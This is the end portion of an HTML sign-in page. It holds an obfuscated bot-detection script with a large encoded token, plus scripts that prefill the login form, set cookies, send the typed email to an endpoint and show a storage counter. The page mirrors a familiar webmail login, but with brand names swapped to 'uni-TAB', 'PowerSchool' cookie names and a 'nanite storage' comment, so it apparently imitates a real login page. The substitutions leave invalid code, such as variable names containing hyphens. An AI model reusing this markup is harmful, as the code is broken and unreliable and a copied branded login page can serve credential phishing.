E.handleEvent(z)}),E[h]}),V=(J.vu=function(E){return(E=window.performance)&&E.now?function(){return E.now()|0}:function(){return+new Date}}(),function(E,z,k,B){for(k=O(E),B=0;0<z;z--)B=B<<8|O(E);C(E,k,B)}),R=(J.QC=function(E,z,k,B,y,g){for(k=[],g=B=0;g<E.length;g++)for(y=y<<z|E[g],B+=z;7<B;)B-=8,k.push(y>>B&255);return k},J.U=function(E,z,k,B,y,g,t,c,X,Z,l,v,bE,H,Jq,d,x,m){if(this.R)return this.R;try{for(this.A=false,z=this.L(this.a).length,k=this.L(this.S).length,B=this.L(this.I),this.B[this.Y]&&uE(this,this.L(this.Y)),y=this.L(this.c),0<y.length&&T(this,this.a,N(y.length,2).concat(y),this.cu),g=this.L(this.w)&511,g-=this.L(this.a).length+5,t=this.L(this.S),4<t.length&&(g-=t.length+3),0<g&&T(this,this.a,N(g,2).concat(F(g)),this.sW),4<t.length&&T(this,this.a,N(t.length,2).concat(t),this.EW),c=F(2).concat(this.L(this.a)),c[1]=c[0]^3,g=0,y=[];g<c.length;g+=3)Z=c[g],v=(l=g+1<c.length)?c[g+1]:0,H=(bE=g+2<c.length)?c[g+2]:0,x=H&63,Jq=(Z&3)<<4|v>>4,d=(v&15)<<2|H>>6,t=Z>>2,bE||(x=64,l||(d=64)),y.push(e[t],e[Jq],e[d],e[x]);if(X=y.join(""))X="!"+X;else for(Z=0,X="";Z<c.length;Z++)m=c[Z][this.u](16),1==m.length&&(m="0"+m),X+=m;this.L(this.a).length=z,this.L(this.S).length=k,C(this,this.I,B),E=X,this.A=true}catch(hq){n(this,hq),E=this.R}return E},J.gI=function(E,z,k){return z^=z<<13,z^=z>>17,(z=(z^z<<5)&k)||(z=1),E^z},J.l=function(E,z,k,B,y,g){try{for(B=0,z=5001,k=void 0,E=this.O.length;--z&&(B=this.L(this.M))<E;)try{C(this,this.P,B),y=O(this),(k=this.L(y))&&k.call?k(this):this.j(this.zH,0,y)}catch(t){t!=this.T&&(g=this.L(this.s),g!=this.s?(C(this,g,t),C(this,this.s,this.s)):this.j(this.N,t))}z||this.j(this.MK)}catch(t){try{this.j(this.N,t)}catch(c){n(this,c)}}return this.L(this.J)},function(E,z,k,B){k=O(E),B=O(E),T(E,B,N(E.L(k),z))}),G=(J.NK=function(E,z){return z=this.U(),E&&E(z),z},function(E,z,k,B,y,g){B=z&3,k=z&4,y=O(E),g=O(E),y=E.L(y),k&&(y=tq((""+y).replace(/\\r\\n/g,"\\n"))),B&&T(E,g,N(y.length,2)),T(E,g,y)});J.$U=function(E,z,k,B,y){for(y=B=0;y<E.length;y++)B+=E.charCodeAt(y),B+=B<<10,B^=B>>6;return B+=B<<3,B^=B>>11,E=B+(B<<15)>>>0,B=new Number(E&(1<<z)-1),B[0]=(E>>>z)%k,B};try{W(window,"unload",function(){})}catch(E){}Y("botguard.bg",f),Y("botguard.bg.prototype.invoke",f.prototype.NK);')})()</script>
  <script type="text/javascript">
  document.bg = new botguard.bg('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');
  </script>
<script> 
  function gaia_parseFragment() {
  var hash = location.hash;
  var params = {};
  if (!hash) {
  return params;
  }
  var paramStrs = decodeURIComponent(hash.substring(1)).split('&');
  for (var i = 0; i < paramStrs.length; i++) {
      var param = paramStrs[i].split('=');
      params[param[0]] = param[1];
    }
    return params;
  }
 
  function gaia_prefillEmail() {
    var form = null;
    if (document.getElementById) {
      form = document.getElementById('gaia_loginform');
    }
 
    if (form && form.Email &&
        (form.Email.value == null || form.Email.value == '')
        && (form.Email.type != 'hidden')) {
      hashParams = gaia_parseFragment();
      if (hashParams['Email'] && hashParams['Email'] != '') {
        form.Email.value = hashParams['Email'];
      }
    }
  }
 
  
  try {
    gaia_prefillEmail();
  } catch (e) {
  }
  
</script>
<script> 
  function gaia_setFocus() {
  var form = null;
  var isFocusableField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  if (inputElement.type != 'hidden' && inputElement.focus &&
  inputElement.style.display != 'none') {
  return true;
  }
  return false;
  };
  var isFocusableErrorField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  var hasError = inputElement.className.indexOf('form-error') > -1;
  if (hasError && isFocusableField(inputElement)) {
  return true;
  }
  return false;
  };
  var isFocusableEmptyField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  var isEmpty = inputElement.value == null || inputElement.value == '';
  if (isEmpty && isFocusableField(inputElement)) {
  return true;
  }
  return false;
  };
  if (document.getElementById) {
  form = document.getElementById('gaia_loginform');
  }
  if (form) {
  var userAgent = navigator.userAgent.toLowerCase();
  var formFields = form.getElementsByTagName('input');
  for (var i = 0; i < formFields.length; i++) {
        var currentField = formFields[i];
        if (isFocusableErrorField(currentField)) {
          currentField.focus();
          
          var currentValue = currentField.value;
          currentField.value = '';
          currentField.value = currentValue;
          return;
        }
      }
      
      
      
        for (var j = 0; j < formFields.length; j++) {
          var currentField = formFields[j];
          if (isFocusableEmptyField(currentField)) {
            currentField.focus();
            return;
          }
        }
      
    }
  }
 
  
  
    gaia_attachEvent(window, 'load', gaia_setFocus);
  
  
</script>
<script> 
  var gaia_scrollToElement = function(element) {
  var calculateOffsetHeight = function(element) {
  var curtop = 0;
  if (element.offsetParent) {
  while (element) {
  curtop += element.offsetTop;
  element = element.offsetParent;
  }
  }
  return curtop;
  }
  var siginOffsetHeight = calculateOffsetHeight(element);
  var scrollHeight = siginOffsetHeight - window.innerHeight +
  element.clientHeight + 0.02 * window.innerHeight;
  window.scroll(0, scrollHeight);
  }
</script>
<script> 
  (function(){
  var signinInput = document.getElementById('signIn');
  gaia_onLoginSubmit = function() {
  try {
  gaia.loginAutoRedirect.stop();
  } catch (err) {
  // do not prevent form from being submitted
  }
  try {
  document.bg.invoke(function(response) {
  document.getElementById('bgresponse').value = response;
  });
  } catch (err) {
  document.getElementById('bgresponse').value = '';
  }
  return true;
  }
  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
  var signinButton = document.getElementById('signIn');
  gaia_attachEvent(window, 'load', function(){
  gaia_scrollToElement(signinButton);
  });
  })();
</script>
<script type="text/javascript">
var BrowserSupport_={IsBrowserSupported:function(){var agt=navigator.userAgent.toLowerCase();var is_op=agt.indexOf("opera")!=-1;var is_ie=agt.indexOf("msie")!=-1&&document.all&&!is_op;var is_ie5=agt.indexOf("msie 5")!=-1&&document.all&&!is_op;var is_mac=agt.indexOf("mac")!=-1;var is_gk=agt.indexOf("gecko")!=-1;var is_sf=agt.indexOf("safari")!=-1;if(is_ie&&!is_op&&!is_mac){if(agt.indexOf("palmsource")!=
-1||agt.indexOf("regking")!=-1||agt.indexOf("windows ce")!=-1||agt.indexOf("j2me")!=-1||agt.indexOf("avantgo")!=-1||agt.indexOf(" stb")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"msie ");if(v!=null)return v>=5.5}if(is_gk&&!is_sf){var v=BrowserSupport_.GetFollowingFloat(agt,"rv:");if(v!=null)return v>=1.4;else{v=BrowserSupport_.GetFollowingFloat(agt,"galeon/");if(v!=null)return v>=
1.3}}if(is_sf){if(agt.indexOf("rv:3.14.15.92.65")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"applewebkit/");if(v!=null)return v>=312}if(is_op){if(agt.indexOf("sony/com1")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"opera ");if(v==null)v=BrowserSupport_.GetFollowingFloat(agt,"opera/");if(v!=null)return v>=8}if(agt.indexOf("pda; sony/com2")!=-1)return true;return false},
GetFollowingFloat:function(str,pfx){var i=str.indexOf(pfx);if(i!=-1){var v=parseFloat(str.substring(i+pfx.length));if(!isNaN(v))return v}return null}};var is_browser_supported=BrowserSupport_.IsBrowserSupported()
  </script>
<script type="text/javascript"> 
<!--
 
var start_time = (new Date()).getTime();
 
if (top.location != self.location) {
 top.location = self.location.href;
}
 
function SetPowerSchoolCookie(name, value) {
  document.cookie = name + "=" + value + ";path=/;domain=.uni-TAB.com";
}
 
function lg() {
  var now = (new Date()).getTime();
 
  var cookie = "T" + start_time + "/" + start_time + "/" + now;
  SetPowerSchoolCookie("PowerSchool_LOGIN", cookie);
}
 
function StripParam(url, param) {
  var start = url.indexOf(param);
  if (start == -1) return url;
  var end = start + param.length;
 
  var charBefore = url.charAt(start-1);
  if (charBefore != '?' && charBefore != '&') return url;
 
  var charAfter = (url.length >= end+1) ? url.charAt(end) : '';
  if (charAfter != '' && charAfter != '&' && charAfter != '#') return url;
  if (charBefore == '&') {
  --start;
  } else if (charAfter == '&') {
  ++end;
  }
  return url.substring(0, start) + url.substring(end);
}
var fixed = 0;
function FixForm() {
  if (is_browser_supported) {
  var form = el("gaia_loginform");
  if (form && form["continue"]) {
  var url = form["continue"].value;
  url = StripParam(url, "ui=html");
  url = StripParam(url, "zy=l");
  form["continue"].value = url;
  }
  }
  fixed = 1;
}
function el(id) {
  if (document.getElementById) {
  return document.getElementById(id);
  } else if (window[id]) {
  return window[id];
  }
  return null;
}
// Estimates of nanite storage generation over time.
var CP = [
 [ 1224486000000, 7254 ],
 [ 1335290400000, 7704 ],
 [ 1335376800000, 10240 ],
 [ 2144908800000, 13531 ],
 [ 2147328000000, 43008 ],
 [ 46893711600000, Number.MAX_VALUE ]
];
var quota_elem;
var ONE_PX = "https://mail.uni-TAB.com/mail/images/cleardot.gif?t=" +
  (new Date()).getTime();
function LogRoundtripTime() {
  var img = new Image();
  var start = (new Date()).getTime();
  img.onload = GetRoundtripTimeFunction(start);
  img.src = ONE_PX;
}
function GetRoundtripTimeFunction(start) {
  return function() {
  var end = (new Date()).getTime();
  SetPowerSchoolCookie("PowerSchool_RTT", (end - start));
  }
}
function MaybePingUser() {
  var f = el("gaia_loginform");
  if (f.Email.value) {
  new Image().src = 'https://mail.uni-TAB.com/mail/gxlu?email=' +
  encodeURIComponent(f.Email.value) +
  '&zx=' + (new Date().getTime());
  }
}
var passwd_elem = el("Passwd");
if (passwd_elem) {
  passwd_elem.onfocus = MaybePingUser;
}
function OnLoad() {
  MaybePingUser();
  LogRoundtripTime();
  if (!quota_elem) {
  quota_elem = el("quota");
  updateQuota();
  }
  LoadConversionScript();
}
function updateQuota() {
  if (!quota_elem) {
  return;
  }
  var now = (new Date()).getTime();
  var i;
  for (i = 0; i < CP.length; i++) {
    if (now < CP[i][0]) {
      break;
    }
  }
  if (i == 0) {
    setTimeout(updateQuota, 1000);
  } else if (i == CP.length) {
    quota_elem.innerHTML = CP[i - 1][1];
  } else {
    var ts = CP[i - 1][0];
    var bs = CP[i - 1][1];
    quota_elem.innerHTML = format(((now-ts) / (CP[i][0]-ts) * (CP[i][1]-bs)) + bs);
    setTimeout(updateQuota, 1000);
  }
}
 
var PAD = '.000000';
 
function format(num) {
  var str = String(num);
  var dot = str.indexOf('.');
  if (dot < 0) {
     return str + PAD;
  } if (PAD.length > (str.length - dot)) {
  return str + PAD.substring(str.length - dot);
  } else {
  return str.substring(0, dot + PAD.length);
  }
}
var uni-TAB_conversion_type = 'landing';
var uni-TAB_conversion_id = 1069902127;
var uni-TAB_conversion_language = "en_US";
var uni-TAB_conversion_format = "1";
var uni-TAB_conversion_color = "FFFFFF";
function LoadConversionScript() {
  var script = document.createElement("script");
  script.type = "text/javascript";
  script.src = "https://www.uni-TABadservices.com/pagead/conversion.js";
}
// -->
</script>
<script> 
gaia_attachEvent(window, 'load', function() {
  OnLoad();
  FixForm();
});
(function() {
  var gaiaLoginForm = document.getElementById('gaia_loginform');
  var gaia_onsubmitHandler = gaiaLoginForm.onsubmit;
  gaiaLoginForm.onsubmit = function() {
  lg();
  if (!fixed) {
  FixForm();
  }
  gaia_onsubmitHandler();
  };
})();
</script>
  


</div>
</body>
</html>